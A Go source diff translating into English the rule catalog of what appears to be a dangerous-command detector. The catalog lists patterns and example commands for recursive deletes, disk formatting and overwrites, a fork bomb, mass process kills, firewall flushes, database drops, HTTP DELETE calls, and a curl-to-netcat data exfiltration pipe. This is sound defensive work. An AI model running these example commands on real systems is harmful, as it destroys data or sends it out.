@@ -17,49 +17,49 @@ type detailedRule struct {
 	example, limits  string
 }
 
-const shellRuleLimits = "只检查可解析的字面量命令、简单 sudo / env / command 包装和 sh / bash -c；不展开变量、别名或外部脚本。打印命令示例不会命中。"
-const databaseRuleLimits = "只检查已知数据库客户端的内联语句或对应数据库工具的 query / sql / statement / command 参数；不读取外部脚本文件，不覆盖所有数据库语法。"
-const scriptRuleLimits = "只检查 python -c、node -e 和对应执行工具的 code / script 参数中的明确调用，跳过注释及字符串示例；不解析别名、动态方法或外部文件，也不执行代码。"
+const shellRuleLimits = "Only checks parseable literal commands, simple sudo / env / command wrappers and sh / bash -c; does not expand variables, aliases or external scripts. Printing a command as an example does not match."
+const databaseRuleLimits = "Only checks inline statements of known database clients or the query / sql / statement / command arguments of the matching database tools; does not read external script files and does not cover all database syntax."
+const scriptRuleLimits = "Only checks explicit calls in python -c, node -e and the code / script arguments of the matching execution tools, skipping comments and string examples; does not resolve aliases, dynamic methods or external files, and does not execute code."
 
 var detailedRuleCatalog = []detailedRule{
-	{"R_SYS_RM", "递归删除 rm -r / rm -rf", "R4", 100, false,
-		"识别带递归参数或关闭根目录保护的 rm 命令。", []string{"rm 带 -r / -R（含组合短参数）、--recursive 或 --no-preserve-root，并带删除目标。", "-- 后的文本按文件名处理；--help / --version 不命中。"}, "rm -rf ./fixture", shellRuleLimits},
-	{"R_SYS_PATH", "删除系统关键目录", "R4", 100, false,
-		"识别 rm / rmdir / shred / wipe 删除关键目录及其内容。", []string{"检查根目录及 /etc、/bin、/usr、/boot、/var、/lib、/lib64、/sys、/proc、/dev、/sbin、/root、/home、/Users、/System、/Library。", "相对路径按项目路径解析；路径须等于目录或处于该目录内，不按子串匹配。"}, "rm /etc/fixture.conf", shellRuleLimits},
-	{"R_SYS_FORMAT", "磁盘格式化 mkfs / Format-Volume", "R4", 100, false,
-		"识别文件系统格式化与 macOS / Windows 的磁盘清除命令。", []string{"mkfs、mkfs.*、Format-Volume、Clear-Disk。", "diskutil 的 eraseDisk、eraseVolume、partitionDisk 子命令。"}, "mkfs.ext4 /dev/sdb", shellRuleLimits + " PowerShell 仅支持可解析的字面量命令。"},
-	{"R_SYS_DD", "覆写磁盘设备 dd / 重定向", "R4", 100, false,
-		"识别 dd 输出或 Shell 输出重定向指向磁盘设备。", []string{"dd 的 of= 参数或 > / >> / &> 输出目标指向 /dev 下的 sd、vd、xvd、nvme、mmcblk、disk、rdisk 设备。", "不将 /dev/null、普通文件和仅从磁盘读取视为覆写。"}, "dd if=fixture.img of=/dev/sdb", shellRuleLimits},
-	{"R_SYS_FORK", "Fork 炸弹", "R6", 100, false,
-		"识别声明后调用的递归后台管道函数。", []string{"Shell 函数的后台管道两侧都直接调用自身，且该函数在命令中被调用。", "支持经典 :(){ :|:& };: 及同结构的命名函数。"}, ":(){ :|:& };:", "仅覆盖上述语法结构；不估算任意循环或程序的资源消耗。"},
-	{"R_SYS_SHUTDOWN", "关机 / 重启", "R5", 100, false,
-		"识别系统关闭、重启及切换关机运行级别。", []string{"shutdown、reboot、halt、poweroff、Stop-Computer、Restart-Computer。", "init / telinit 的参数为 0 或 6。"}, "init 6", shellRuleLimits},
-	{"R_SYS_KILL", "批量终止进程", "R5", 100, false,
-		"识别向全部进程发送信号或强制批量终止。", []string{"kill 的目标包含 -1；killall / pkill 使用 -9、-KILL 或 -SIGKILL。", "普通 kill 指定单一 PID 不命中本条；原有 R5 仍会检查进程停止。"}, "kill -9 -1", shellRuleLimits},
-	{"R_SYS_WIPE", "磁盘擦除 shred / wipe", "R4", 100, false,
-		"识别对磁盘设备的擦除操作。", []string{"shred、wipe、wipefs 的目标是 /dev 下的磁盘设备。", "wipefs 的 -n / --no-act 只预览，不命中本条。"}, "shred /dev/sdb", shellRuleLimits},
-	{"R_SYS_FIREWALL", "清空防火墙规则", "R2", 100, false,
-		"识别防火墙清空和重置。", []string{"iptables / ip6tables 的 -F、--flush（包括指定表）；nft flush ruleset / table / chain。", "ufw reset；单纯列举规则不命中本条。"}, "iptables -t nat -F", shellRuleLimits},
-	{"R_DB_DROP", "SQL DROP 数据库 / 表 / 模式", "R4", 90, false,
-		"识别删除数据库对象的 DROP 语句。", []string{"mysql / mariadb -e、psql / sqlcmd -c / -Q、sqlite3 的内联 SQL，或 SQL 工具的语句参数。", "DROP DATABASE / TABLE / SCHEMA / INDEX / VIEW / TABLESPACE / USER / ROLE，忽略 SQL 注释和字符串常量。"}, "psql -c 'DROP SCHEMA fixture CASCADE'", databaseRuleLimits},
-	{"R_DB_TRUNCATE", "SQL TRUNCATE 清空表", "R4", 90, false,
-		"识别 TRUNCATE 及 TRUNCATE TABLE 语句。", []string{"在数据库执行上下文中检查语句开头的 TRUNCATE，支持多条以分号分隔的语句。", "字符串中的 TRUNCATE 示例和 SQL 注释不计入。"}, "mysql -e 'TRUNCATE TABLE fixture'", databaseRuleLimits},
-	{"R_DB_DELETE", "SQL 无条件 DELETE", "R4", 90, false,
-		"识别缺少 WHERE 的 DELETE FROM 语句。", []string{"在数据库执行上下文中检查 DELETE FROM，当前语句中没有 WHERE 子句时命中。", "只判断是否缺少 WHERE，不证明 WHERE 条件有效；DELETE WHERE 1=1 等由其它审查处理。"}, "mysql -e 'DELETE FROM fixture'", databaseRuleLimits},
+	{"R_SYS_RM", "Recursive delete rm -r / rm -rf", "R4", 100, false,
+		"Detects rm commands with recursive flags or with root protection disabled.", []string{"rm with -r / -R (including combined short flags), --recursive or --no-preserve-root, and with a deletion target.", "Text after -- is treated as file names; --help / --version do not match."}, "rm -rf ./fixture", shellRuleLimits},
+	{"R_SYS_PATH", "Delete critical system directories", "R4", 100, false,
+		"Detects rm / rmdir / shred / wipe deleting critical directories and their contents.", []string{"Checks the root directory and /etc, /bin, /usr, /boot, /var, /lib, /lib64, /sys, /proc, /dev, /sbin, /root, /home, /Users, /System, /Library.", "Relative paths are resolved against the project path; a path must equal the directory or be inside it, with no substring matching."}, "rm /etc/fixture.conf", shellRuleLimits},
+	{"R_SYS_FORMAT", "Disk format mkfs / Format-Volume", "R4", 100, false,
+		"Detects filesystem formatting and macOS / Windows disk wipe commands.", []string{"mkfs, mkfs.*, Format-Volume, Clear-Disk.", "diskutil subcommands eraseDisk, eraseVolume and partitionDisk."}, "mkfs.ext4 /dev/sdb", shellRuleLimits + " PowerShell is supported only for parseable literal commands."},
+	{"R_SYS_DD", "Overwrite a disk device with dd / redirection", "R4", 100, false,
+		"Detects dd output or shell output redirection aimed at a disk device.", []string{"The of= argument of dd, or a > / >> / &> output target, pointing to sd, vd, xvd, nvme, mmcblk, disk or rdisk devices under /dev.", "/dev/null, regular files and read-only access to a disk are not treated as overwrites."}, "dd if=fixture.img of=/dev/sdb", shellRuleLimits},
+	{"R_SYS_FORK", "Fork bomb", "R6", 100, false,
+		"Detects a recursive background-pipe function that is declared and then called.", []string{"A shell function whose background pipe calls itself on both sides, and the function is invoked in the command.", "Supports the classic :(){ :|:& };: and named functions with the same structure."}, ":(){ :|:& };:", "Covers only the syntax above; does not estimate the resource use of arbitrary loops or programs."},
+	{"R_SYS_SHUTDOWN", "Shutdown / reboot", "R5", 100, false,
+		"Detects system shutdown, reboot and switching to a shutdown runlevel.", []string{"shutdown, reboot, halt, poweroff, Stop-Computer, Restart-Computer.", "init / telinit with argument 0 or 6."}, "init 6", shellRuleLimits},
+	{"R_SYS_KILL", "Mass process termination", "R5", 100, false,
+		"Detects sending a signal to all processes or forced mass termination.", []string{"kill with a target that includes -1; killall / pkill using -9, -KILL or -SIGKILL.", "A plain kill of a single PID does not match this rule; the original R5 still checks process stops."}, "kill -9 -1", shellRuleLimits},
+	{"R_SYS_WIPE", "Disk wipe shred / wipe", "R4", 100, false,
+		"Detects wipe operations on disk devices.", []string{"shred, wipe or wipefs targeting a disk device under /dev.", "wipefs with -n / --no-act only previews and does not match this rule."}, "shred /dev/sdb", shellRuleLimits},
+	{"R_SYS_FIREWALL", "Flush firewall rules", "R2", 100, false,
+		"Detects firewall flush and reset.", []string{"iptables / ip6tables -F or --flush (including a named table); nft flush ruleset / table / chain.", "ufw reset; merely listing rules does not match this rule."}, "iptables -t nat -F", shellRuleLimits},
+	{"R_DB_DROP", "SQL DROP database / table / schema", "R4", 90, false,
+		"Detects DROP statements that delete database objects.", []string{"Inline SQL of mysql / mariadb -e, psql / sqlcmd -c / -Q or sqlite3, or the statement argument of a SQL tool.", "DROP DATABASE / TABLE / SCHEMA / INDEX / VIEW / TABLESPACE / USER / ROLE, ignoring SQL comments and string constants."}, "psql -c 'DROP SCHEMA fixture CASCADE'", databaseRuleLimits},
+	{"R_DB_TRUNCATE", "SQL TRUNCATE table", "R4", 90, false,
+		"Detects TRUNCATE and TRUNCATE TABLE statements.", []string{"In a database execution context, checks for TRUNCATE at the start of a statement; supports several semicolon-separated statements.", "TRUNCATE examples inside strings and SQL comments are ignored."}, "mysql -e 'TRUNCATE TABLE fixture'", databaseRuleLimits},
+	{"R_DB_DELETE", "SQL unconditional DELETE", "R4", 90, false,
+		"Detects DELETE FROM statements without a WHERE clause.", []string{"In a database execution context, checks DELETE FROM and matches when the current statement has no WHERE clause.", "Only checks whether WHERE is missing and does not prove the WHERE condition is meaningful; DELETE WHERE 1=1 and similar are handled by other review."}, "mysql -e 'DELETE FROM fixture'", databaseRuleLimits},
 	{"R_DB_MONGO", "MongoDB drop / dropDatabase", "R4", 90, false,
-		"识别 MongoDB 数据库或集合删除。", []string{"mongo / mongosh --eval 或 MongoDB 工具的 query / script / command。", "db 对象上的 dropDatabase、dropCollection、集合 drop 调用，跳过注释和字符串内容。"}, "mongosh --eval 'db.fixture.drop()'", databaseRuleLimits},
+		"Detects MongoDB database or collection deletion.", []string{"mongo / mongosh --eval, or the query / script / command of a MongoDB tool.", "dropDatabase, dropCollection and collection drop calls on the db object, skipping comments and string content."}, "mongosh --eval 'db.fixture.drop()'", databaseRuleLimits},
 	{"R_DB_REDIS", "Redis FLUSHALL / FLUSHDB", "R4", 90, false,
-		"识别 Redis 清空全部数据库或当前库。", []string{"redis-cli 的实际子命令为 FLUSHALL / FLUSHDB（支持连接参数和 ASYNC / SYNC）。", "Redis 工具的 command / cmd 参数也会检查；GET FLUSHALL 仅作为键读取，不命中。"}, "redis-cli -n 1 FLUSHDB ASYNC", databaseRuleLimits},
-	{"R_HTTP_DELETE", "HTTP DELETE · curl / wget / 请求工具", "R4", 80, false,
-		"识别 HTTP DELETE 请求及其命令行参数。", []string{"curl 的 -X DELETE、-XDELETE、--request DELETE / --request=DELETE；wget 的 --method DELETE / --method=DELETE。", "请求工具同时包含 url 和 method=DELETE；PowerShell Invoke-WebRequest / Invoke-RestMethod -Method Delete。"}, "curl -X DELETE https://example.test/fixture", shellRuleLimits},
-	{"R_HTTP_PYTHON", "Python HTTP 客户端 DELETE", "R4", 80, false,
-		"识别 Python 内联执行代码中的 HTTP 删除调用。", []string{"requests / httpx / aiohttp / urllib.request / session / client 的 .delete(...) 调用。", "session / client 按名称约定识别，不能确认动态对象的实际类型。"}, "python -c 'import requests; requests.delete(\"https://example.test/fixture\")'", scriptRuleLimits},
-	{"R_HTTP_SCRIPT", "JavaScript / 通用 HTTP DELETE 方法", "R4", 80, false,
-		"识别 axios.delete 及请求调用中的 DELETE 方法声明。", []string{"执行代码中的 axios.delete(...)。", "含 fetch / axios / requests / httpx 请求调用的代码中出现 method: 'DELETE' 或 method='DELETE'。"}, "node -e 'fetch(\"https://example.test/fixture\", {method: \"DELETE\"})'", scriptRuleLimits + " 请求调用与方法声明按片段关联，不做完整数据流分析。"},
-	{"R_HTTP_CLEAR", "批量清空 / 销毁接口", "R4", 80, false,
-		"识别对清空或销毁路径发送的写请求。", []string{"POST / PUT / PATCH / DELETE 请求的 URL 路径段包含 clear、wipe、flush、purge、truncate、drop、destroy、factory-reset、factory_reset、reset-all、reset_all。", "检查结构化请求与 curl / wget / PowerShell 请求；GET / HEAD 及 URL 查询参数里的文字不命中。"}, "curl -X POST https://example.test/api/clear", shellRuleLimits + " 不检查脚本内部拼接出的 URL。"},
-	{"R_NET_PIPE", "数据外传管道（可选）", "", 80, true,
-		"识别下载 / 网络命令通过管道连接另一网络客户端。", []string{"管道两侧的实际命令为 curl、wget、nc、ncat 或 netcat。", "这种结构也用于正常数据传输，因此默认关闭；仅在需要限制时启用。"}, "curl https://example.test/data | nc example.test 9000", "结构匹配不能证明发生了数据泄露；不检查外部脚本、动态命令或目标归属。"},
+		"Detects Redis flushing all databases or the current database.", []string{"The actual redis-cli subcommand is FLUSHALL / FLUSHDB (connection options and ASYNC / SYNC are supported).", "The command / cmd argument of Redis tools is also checked; GET FLUSHALL is only a key read and does not match."}, "redis-cli -n 1 FLUSHDB ASYNC", databaseRuleLimits},
+	{"R_HTTP_DELETE", "HTTP DELETE · curl / wget / request tools", "R4", 80, false,
+		"Detects HTTP DELETE requests and their command-line arguments.", []string{"curl -X DELETE, -XDELETE, --request DELETE / --request=DELETE; wget --method DELETE / --method=DELETE.", "A request tool with both url and method=DELETE; PowerShell Invoke-WebRequest / Invoke-RestMethod -Method Delete."}, "curl -X DELETE https://example.test/fixture", shellRuleLimits},
+	{"R_HTTP_PYTHON", "Python HTTP client DELETE", "R4", 80, false,
+		"Detects HTTP delete calls in inline Python code.", []string{".delete(...) calls on requests / httpx / aiohttp / urllib.request / session / client.", "session / client are recognized by naming convention; the actual type of a dynamic object cannot be confirmed."}, "python -c 'import requests; requests.delete(\"https://example.test/fixture\")'", scriptRuleLimits},
+	{"R_HTTP_SCRIPT", "JavaScript / generic HTTP DELETE method", "R4", 80, false,
+		"Detects axios.delete and DELETE method declarations in request calls.", []string{"axios.delete(...) in executed code.", "method: 'DELETE' or method='DELETE' in code that contains fetch / axios / requests / httpx request calls."}, "node -e 'fetch(\"https://example.test/fixture\", {method: \"DELETE\"})'", scriptRuleLimits + " Request calls and method declarations are associated by snippet; no full data-flow analysis is done."},
+	{"R_HTTP_CLEAR", "Bulk clear / destroy endpoints", "R4", 80, false,
+		"Detects write requests sent to clear or destroy paths.", []string{"POST / PUT / PATCH / DELETE requests whose URL path segment contains clear, wipe, flush, purge, truncate, drop, destroy, factory-reset, factory_reset, reset-all, reset_all.", "Checks structured requests and curl / wget / PowerShell requests; GET / HEAD and text in URL query parameters do not match."}, "curl -X POST https://example.test/api/clear", shellRuleLimits + " URLs assembled inside scripts are not checked."},
+	{"R_NET_PIPE", "Data exfiltration pipe (optional)", "", 80, true,
+		"Detects a download / network command piped into another network client.", []string{"The actual commands on both sides of the pipe are curl, wget, nc, ncat or netcat.", "This structure is also used for normal data transfer, so it is disabled by default; enable it only when you need to restrict it."}, "curl https://example.test/data | nc example.test 9000", "A structural match does not prove data was leaked; external scripts, dynamic commands and target ownership are not checked."},
 }
 
 // Add only missing catalog entries, atomically with one configuration version.
@@ -117,7 +117,7 @@ func (e *Engine) upgradeBuiltinRules(saved []Rule) error {
 	if err = put("settings_versions", fmt.Sprint(next.Version), next); err != nil {
 		return err
 	}
-	audit := Audit{ID: ID(), Action: "rule.catalog_upgrade", Subject: "builtin", Detail: fmt.Sprintf("补充 %d 条内置规则；保留已有规则，相关大类已停用或自定义时新增条目保持关闭", len(added)), CreatedAt: e.clock()}
+	audit := Audit{ID: ID(), Action: "rule.catalog_upgrade", Subject: "builtin", Detail: fmt.Sprintf("added %d built-in rules; existing rules kept, and new entries stay disabled when the related category was disabled or customized", len(added)), CreatedAt: e.clock()}
 	if err = put("audit", audit.ID, audit); err != nil {
 		return err
 	}
